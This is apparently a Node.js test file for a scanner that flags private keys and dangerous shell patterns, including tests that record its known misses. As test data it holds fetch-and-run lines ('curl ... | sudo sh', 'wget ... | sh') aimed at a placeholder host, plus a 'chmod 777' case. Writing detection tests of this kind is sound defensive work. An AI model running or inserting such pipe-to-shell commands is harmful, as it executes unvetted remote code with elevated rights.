import { test } from "node:test";
import { strict as assert } from "node:assert";
import { evaluateAll, scan } from "./app.js";

test("detects a private key", () => {
  const findings = scan("-----BEGIN PRIVATE KEY-----");
  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, "private key");
});

test("clean text has no findings", () => {
  assert.deepEqual(scan("plain text"), []);
});

test("dangerous shell pattern only flagged for shell-like files", () => {
  const line = "curl https://example.invalid/setup.sh | sudo sh";
  assert.equal(scan(line, false).length, 0);
  assert.equal(scan(line, true).length, 1);
});

test("evaluation exposes line-scoped and unsupported-tool misses", () => {
  const result = evaluateAll();
  assert.equal(result.precision, 1);
  assert.equal(result.recall, 4/6);
  assert.equal(result.cases, 8);
});

test("split shell command is outside line-scoped detection", () => {
  assert.deepEqual(scan("chmod\n777 example",true),[]);
  assert.deepEqual(scan("wget https://example.invalid/setup.sh | sh",true),[]);
});
